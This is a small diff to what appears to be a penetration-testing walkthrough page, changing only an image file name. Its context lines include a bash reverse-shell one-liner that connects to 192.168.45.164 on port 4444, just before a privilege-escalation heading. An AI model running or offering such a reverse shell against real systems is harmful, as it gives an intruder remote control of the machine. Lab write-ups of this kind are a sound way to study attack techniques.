@@ -76,7 +76,7 @@ We can get a reverse shell using this one-liner:
 bash -c 'bash -i >& /dev/tcp/192.168.45.164/4444 0>&1'
 ```
 
-<figure><img src="../../../.gitbook/assets/image (56).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (56) (5).png" alt=""><figcaption></figcaption></figure>
 
 ## Privilege Escalation
 
